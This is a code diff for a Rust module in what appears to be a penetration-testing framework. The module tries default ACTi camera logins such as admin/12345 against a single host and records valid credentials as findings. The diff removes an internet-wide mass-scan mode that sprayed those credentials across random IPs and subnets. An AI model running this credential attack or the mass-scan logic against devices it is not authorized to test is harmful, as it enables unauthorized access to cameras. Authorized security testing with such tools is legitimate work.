@@ -5,8 +5,8 @@ use ssh2::Session;
 use telnet::{Telnet, Event};
 use std::time::Duration;
 use tokio::{join, task};
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
 use crate::utils::url_encode;
-use crate::utils::{is_mass_scan_target, run_mass_scan, MassScanConfig};
 
 const DEFAULT_TIMEOUT_SECS: u64 = 10;
 
@@ -222,58 +222,18 @@ pub async fn check_http_form(config: &Config) -> Result<Option<(ServiceType, Str
 }
 
 /// Entrypoint for module - parallel checks
-pub async fn run(target: &str) -> Result<()> {
-    // Mass scan mode: random IPs, CIDR subnets, or target file
-    if is_mass_scan_target(target) {
-        return run_mass_scan(target, MassScanConfig {
-            protocol_name: "ACTi Camera",
-            default_port: 80,
-            state_file: "acti_camera_mass_state.log",
-            default_output: "acti_camera_mass_results.txt",
-            default_concurrency: 200,
-        }, |ip: std::net::IpAddr, port: u16| async move {
-            // Quick port check on HTTP
-            if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
-                return None;
-            }
-            let target_str = ip.to_string();
-            let creds = vec![
-                ("admin", "12345"),
-                ("admin", "123456"),
-                ("Admin", "12345"),
-                ("Admin", "123456"),
-            ];
-            // Try HTTP first (most likely for cameras)
-            let client = crate::utils::build_http_client(Duration::from_secs(5)).ok()?;
-            let url = format!("http://{}:{}/", target_str, port);
-            for (user, pass) in &creds {
-                let resp = client.get(&url)
-                    .basic_auth(user, Some(pass))
-                    .send()
-                    .await
-                    .ok()?;
-                if resp.status().is_success() || resp.status().as_u16() == 301 || resp.status().as_u16() == 302 {
-                    let body = match resp.text().await {
-                        Ok(b) => b,
-                        Err(e) => {
-                            crate::mprintln!("{} body decode failed: {}", "[-]".red(), e);
-                            String::new()
-                        }
-                    };
-                    if !body.contains("401") && !body.to_lowercase().contains("unauthorized") {
-                        let msg = format!("{}:{}:HTTP:{}:{}", ip, port, user, pass);
-                        crate::mprintln!("\r{}", format!("[+] FOUND: {}", msg).green().bold());
-                        return Some(format!("{}\n", msg));
-                    }
-                }
-            }
-            None
-        }).await;
-    }
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("acti_camera_default requires a single-host target")?;
 
     display_banner();
     crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
     crate::mprintln!();
+
+    let mut outcome = ModuleOutcome::ok();
+    ctx.rate_limit(target).await;
 
     let creds = vec![
         ("admin", "12345"),
@@ -340,13 +300,24 @@ pub async fn run(target: &str) -> Result<()> {
                 crate::cred_store::CredType::Password,
                 "creds/camera/acti/acti_camera_default",
             ).await;
+            outcome.findings.push(Finding {
+                target: target.to_string(),
+                kind: FindingKind::Credential,
+                message: format!("ACTi default credentials valid {}:{} on {} ({}:{})", user, pass, svc_name, target, svc_port),
+                data: Some(serde_json::json!({
+                    "service": svc_name,
+                    "port": svc_port,
+                    "username": user,
+                    "password": pass,
+                })),
+            });
         }
     } else {
         crate::mprintln!();
         crate::mprintln!("{}", "[-] No valid credentials found on any service.".yellow());
     }
 
-    Ok(())
+    Ok(outcome)
 }
 
 pub fn info() -> crate::module_info::ModuleInfo {
@@ -359,3 +330,5 @@ pub fn info() -> crate::module_info::ModuleInfo {
         rank: crate::module_info::ModuleRank::Normal,
     }
 }
+
+crate::register_native_module!(crate::module::Category::Creds, "camera/acti/acti_camera_default", native);
